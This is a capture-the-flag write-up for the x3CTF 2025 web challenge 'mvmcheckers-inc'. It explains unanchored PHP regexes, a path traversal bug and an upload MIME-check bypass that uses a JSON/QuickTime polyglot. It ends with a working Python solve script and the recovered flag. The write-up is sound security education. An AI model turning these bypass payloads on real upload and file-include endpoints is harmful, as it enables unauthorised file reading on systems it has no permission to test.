# mvmcheckers-inc

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam, @ensy.zip, @ozetta, @.twy
- 24 solves / 211 points
- Author: @joneswastaken
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

Welcome new employee! As you are aware, we at ~~SpellCheckers~~ MVMCheckers Inc. are the foremost experts at creating magical days for our clients. Please fell free to explore our administration application. Be aware that we are currently rebuilding the system using our proprietary, cutting edge interpreter.

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127154903.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127160212.png)

In here, we can view different pages, including: "Magicians", "Magician Administration", "Booking", and "About". Let's quickly walk through them.

In page "Magicians", we can read different magicians' details:

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127160338.png)

Nothing interesting.

Page "Magician Administration":

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127160411.png)

In here, we can **add a magician with our specified name and image**.

Page "Booking":

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127160506.png)

Nothing weird except the request path: `/rebuild/?page=booking.json`. Hmm... The `page` parameter looks interesting, maybe the backend is including that JSON file then display it?

To figure out deeper, we can read this web application's source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/Web/mvmcheckers-inc/MVMCheckers-Inc.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|16:06:58(HKT)]
└> file MVMCheckers-Inc.tar.gz 
MVMCheckers-Inc.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 614400
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|16:07:00(HKT)]
└> tar xvf MVMCheckers-Inc.tar.gz          
MVMCheckers-Inc/
MVMCheckers-Inc/docker-compose.yml
MVMCheckers-Inc/src/
MVMCheckers-Inc/src/booking.php
MVMCheckers-Inc/src/rebuild/
MVMCheckers-Inc/src/rebuild/index.php
[...]
MVMCheckers-Inc/Dockerfile
MVMCheckers-Inc/magicians-agency.iml
```

After reading the source code a little bit, we know that it's written in PHP. Let's dive into those source code!

First off, what's our objective in this challenge? Where's the flag?

In `Dockerfile`, the `flag.txt` file is copied to path `/flag.txt`:

```bash
[...]
First off, what's our objective in this challenge? Where's the flag?

In `Dockerfile`, the `flag.txt` file is copied to path `/flag.txt`:

COPY flag.txt /flag.txt
```

Other than that, there's not much we can know how to read this flag file.

Remember the request path `/rebuild/?page=booking.json`? Let's see if we can read the flag file via that.

In `rebuild/index.php`, we can see that the `page` parameter has some filtering:

```php
<?php
[...]
$pageName = $_GET["page"];

if (!preg_match('/\w{5,10}\.\w{3,5}/', $pageName)) {
    echo "<p>Invalid page name ):</p>";
    exit();
}
```

As we can see, if our `page` parameter is NOT matched to that regex (regular expression) pattern, it'll just stop the script.

If we debug that regex pattern on sites like [regex101.com](https://regex101.com/), we can quickly see this:

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127162331.png)

Turns out, this regex is flawed, as it's missing the `^` (starts with) and `$` (ends with) symbol. Which means, this regex will match 5 to 10 characters + `.` character + 3 to 5 characters, something like `foobar.txt`. Since it'll match the pattern in anywhere of the input string, we can bypass the regex to perform **path traversal** like this: `../../../../../foobarBBBB.txt`

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127162831.png)

After we bypassed that regex pattern, it'll read the file based on our `page` parameter's value, replace `\` character with an empty string, and JSON decode it:

```php
[...]
$pageString = file_get_contents("./$pageName");
$sanitized = str_replace("\\", "", $pageString);
$pageObject = json_decode($sanitized, flags: JSON_INVALID_UTF8_IGNORE);

if ($pageObject == null) {
    echo "<p>This page does not exist ):</p>";
    exit();
}
```

According to [PHP documentation about function `json_decode`](https://www.php.net/manual/en/function.json-decode.php#refsect1-function.json-decode-returnvalues), if the JSON cannot be decoded, it'll return `null`. Well, since the flag file is not a JSON file, it can't be decoded. So, we can't leverage the path traversal vulnerability to read the flag. Anyway, let's continue reading the code.

After parsing the given JSON file, it'll loop through the associative array `sections`:

```php
[...]
function interpret($section) {
    $content = null;

    switch ($section->type) {
        case "text":
            $content = $section->value;
            break;
        case "link":
            $content = file_get_contents($section->value);
            break;
    }

    return "<$section->tag>$content</$section->tag>";
}

echo "<div class='container my-8 text-center'/>";

foreach ($pageObject->sections as $section) {
    echo interpret($section);
}

echo "</div>";
```

When looping those `sections`, it'll display the return value of function `interpret`. Inside this function, when attribute `type` is `text`, it'll return string `<tag_name>$content</tag_name>`. **When attribute `type` is `link`, it'll read the file's content based on attribute value `value`, and return string `<tag_name>$file_content</tag_name>`**.

For having a clear picture, let's look at the following example, `about.json`:

```json
{
  "sections": [
    {"type": "text", "tag": "h1", "value": "The leading experts in spell-full entertainment"},
    {"type": "text", "tag": "p", "value": "We at SpellCheckers Inc. are the foremost experts at creating magical days for our clients."},
    {"type": "link", "tag": "i", "value":  "./footnote.txt"}
  ]
}
```

Hmm... **What if the JSON file has `type` is `link`, and the value is the flag file's path?**

```json
{
  "sections": [
    {"type": "link", "tag": "i", "value": "/flag.txt"}
  ]
}
```

In theory, we should be able to get the flag if somehow we can **upload arbitrary JSON files with the above JSON object**.

Ah, speaking of file upload, let's take a look at the "Magician Administration" page.

In `administration.php`, it has some simple file upload validations.

It'll first get the MIME type's **summary** of the file using OS command `file -b <filename>` and the output is matched against with a regex pattern:

```php
[...]
$tmpFile = $_FILES["magician"]["tmp_name"];

$mime = shell_exec("file -b $tmpFile");

if (!preg_match('/\w{1,5} image.*/', $mime)) {
    echo "<p>Invalid upload!</p>";
    exit();
}
```

Right off the bat, running dangerous functions like `shell_exec` with a user controlled input is always bad. Well, not in this case. Since [`tmp_name`](https://www.php.net/manual/en/features.file-upload.post-method.php) is a PHP generated random string (Something like `/tmp/phpXXXXXXX`), we can't control it. Which means in this case, we can't do command or argument injection.

Hmm... Maybe we can bypass the MIME type check? In the regex pattern, we can see that it has the exact flaw with the previous one, which is missing the `^` and `$` symbol. So, if the MIME type's summary contains `<anything><space>image`, it'll pass the check:

![](https://github.com/siunam321/CTF-Writeups/blob/main/x3CTF-2025/images/Pasted%20image%2020250127170421.png)

Therefore, we need to somehow make the `file` command to output a summary that contains `<anything><space>image`.

Next up, if the filename contains the word `php`, the file will not be uploaded:

```php
[...]
$uploadFile = "./magicians/" . $_POST["name"] . ".magic";
[...]
if (str_contains($uploadFile, "php")) {
    echo "<p>Invalid magician name!</p>";
    exit();
}
```

Another interesting thing is that it doesn't sanitize our filename for path traversal. So in theory, we can upload the file to anywhere we want, with the annoying `.magic` extension of course.

If all of the above validations are passed, it uses [PHP function `move_uploaded_file`](https://www.php.net/manual/en/function.move-uploaded-file.php) to move the temporary file to the upload file path (`$uploadFile`):

```php
[...]
echo "<p>";
if (move_uploaded_file($tmpFile, $uploadFile)) {
    echo "Magician successfully uploaded!";
} else {
    echo "Magician upload failed :(";
}
echo "</p>";
```

Huh, so now, we need to somehow **upload a valid JSON file, yet it's an image file**. In other words, a **polyglot**.

Because command `file` is based on the [compiled magic file](https://man7.org/linux/man-pages/man1/file.1.html), it makes a lot of sense if we find all the images file in that magic file. There are many magic files that we can find, like the one from the [file GitHub repository](https://github.com/file/file/blob/master/magic/Magdir/images). For me, I'll find them in [this PHP GitHub repository](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime).

Moreover, the image file MIME type has some constraints:
1. Byte number to begin checking must not be from the beginning (`0`)
2. The MIME type must contain `<anything><space>image` in the summary

So that we can construct the following valid JSON and image MIME type:

```json
{"fooMAGIC_NUMBER_HERE":"bar", "sections": [{"type": "link", "tag": "i", "value": "/flag.txt"}]}
```

After some searching, this [QuickTime Image MIME type](https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime#L672) caught my eyes:

```ini
# The format is 4-5 columns:
#    Column #1: byte number to begin checking from, ">" indicates continuation
#    Column #2: type of data to match
#    Column #3: contents of data to match
#    Column #4: MIME type of result
#    Column #5: MIME encoding of result (optional)
[...]
4	string		idsc	      image/x-quicktime
```

```shell
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|17:28:48(HKT)]
└> echo -n 'foooidsc' > image_file
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|17:29:19(HKT)]
└> file -b image_file         
Apple QuickTime image (fast start)
```

By using this MIME type, we should be able to construct the following valid JSON and image MIME type:

```json
{"AAidsc":"bar", "sections": [{"type": "link", "tag": "i", "value": "/flag.txt"}]}
```

```shell
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|17:30:10(HKT)]
└> echo -n '{"AAidsc":"bar", "sections": [{"type": "link", "tag": "i", "value": "/flag.txt"}]}' > image_file
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|17:30:14(HKT)]
└> file -b image_file
JSON text data
```

Well... Nope. Since JSON file doesn't have magic number (It says so in [RFC 8259](https://datatracker.ietf.org/doc/html/rfc8259#section-11)), the `file` command have to determine a JSON MIME type differently. To do so, it'll actually try to parse it in order to test if it's a JSON file:

[`src/funcs.c#L390`](https://github.com/file/file/blob/master/src/funcs.c#L390):

```c
/* Check if we have a JSON file */
if ((ms->flags & MAGIC_NO_CHECK_JSON) == 0) {
    m = file_is_json(ms, &b);
    [...]
}
```

[`src/is_json.c#L422`](https://github.com/file/file/blob/master/src/is_json.c#L422):

```c
int
file_is_json(struct magic_set *ms, const struct buffer *b)
{
	const unsigned char *uc = CAST(const unsigned char *, b->fbuf);
	const unsigned char *ue = uc + b->flen;
	size_t st[JSON_MAX];
	int mime = ms->flags & MAGIC_MIME;
    [...]
	memset(st, 0, sizeof(st));
	
	if ((jt = json_parse(&uc, ue, st, 0)) == 0)
		return 0;
    [...]
```

If it parsed successfully, `file` will determine that this file is a JSON file and return JSON MIME type and its summary. With that said, in order to make it not a JSON file, we need to **make `file` unable to parse it**.

But wait, if `file` unable to parse the JSON file, doesn't mean that `rebuild/index.php` also can't parse it?? Well, there is 1 differential between `file` and `rebuild/index.php` parsing:

```php
[...]
$pageName = $_GET["page"];
[...]
$pageString = file_get_contents("./$pageName");
$sanitized = str_replace("\\", "", $pageString);
$pageObject = json_decode($sanitized, flags: JSON_INVALID_UTF8_IGNORE);
```

Previously, I briefly mentioned that the file's **backslash character (`\`) will be replaced by an empty string**. With this, we can leverage this parser differential to bypass the `file`'s MIME type check!

## Exploitation

To do so, we need to make the JSON file's syntax invalid using a `\` character like this:

```json
\{"Aidsc":"bar", "sections": [{"type": "link", "tag": "i", "value": "/flag.txt"}]}
```

```shell
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|19:47:26(HKT)]
└> echo -n '\{"Aidsc":"bar", "sections": [{"type": "link", "tag": "i", "value": "/flag.txt"}]}' > image_file
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|19:47:31(HKT)]
└> file -b image_file
Apple QuickTime image (fast start)
```

Nice! We can now make it as a valid JSON file on the `rebuild/index.php` side, and as an image file on the `file` command side.

Armed with above information, we can get the flag via:
1. Upload the above polyglot JSON file
2. Using path traversal vulnerability at `rebuild/index.php` to read the included flag file via the `page` GET parameter

To automate the above steps, I've written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
import random
import string
import re

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.RANDOM_FILENAME = ''.join(random.choices(string.ascii_letters, k=10))
        self.QUICKTIME_IMAGE_MAGIC_NUMBER = 'idsc' # https://github.com/waviq/PHP/blob/master/Laravel-Orang1/public/filemanager/connectors/php/plugins/rsc/share/magic.mime#L672
        self.PAYLOAD = f'\\{{"A{self.QUICKTIME_IMAGE_MAGIC_NUMBER}":"bar","sections":[{{"type": "link", "tag": "i", "value": "/flag.txt"}}]}}'
        self.FLAG_REGEX = re.compile(r'(MVM{.*})')

    def upload(self):
        print('[*] Uploading polyglot JSON file...')
        
        data = { 'name': self.RANDOM_FILENAME }
        files = { 'magician': (self.RANDOM_FILENAME, self.PAYLOAD) }
        responseText = requests.post(f'{self.baseUrl}/administration.php', data=data, files=files).text
        if 'Magician successfully uploaded!' not in responseText:
            print('[-] Upload failed!')
            exit(0)

    def getFlag(self):
        print('[*] Retrieving the flag...')

        parameter = { 'page': f'../magicians/{self.RANDOM_FILENAME}.magic' }
        responseText = requests.get(f'{self.baseUrl}/rebuild/index.php', params=parameter).text
        flag = self.FLAG_REGEX.search(responseText).group(0)
        if flag is None:
            print('[-] Flag not found!')

        print(f'[+] Flag: {flag}')

    def solve(self):
        self.upload()
        self.getFlag()

if __name__ == '__main__':
    # baseUrl = 'http://localhost' # for local testing
    baseUrl = 'https://98ee1aac-3b5f-49c0-a2eb-883ae3eb4eb1.x3c.tf:31337'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/x3CTF-2025/web/mvmcheckers-inc)-[2025.01.27|20:01:53(HKT)]
└> python3 solve.py
[*] Uploading polyglot JSON file...
[*] Retrieving the flag...
[+] Flag: MVM{c7f5_4r3_4_m461c_pl4c3_4r3n7_7h3y}
```

- **Flag: `MVM{c7f5_4r3_4_m461c_pl4c3_4r3n7_7h3y}`**

## Conclusion

What we've learned:

1. Path traversal and file upload MIME type bypass via parser differential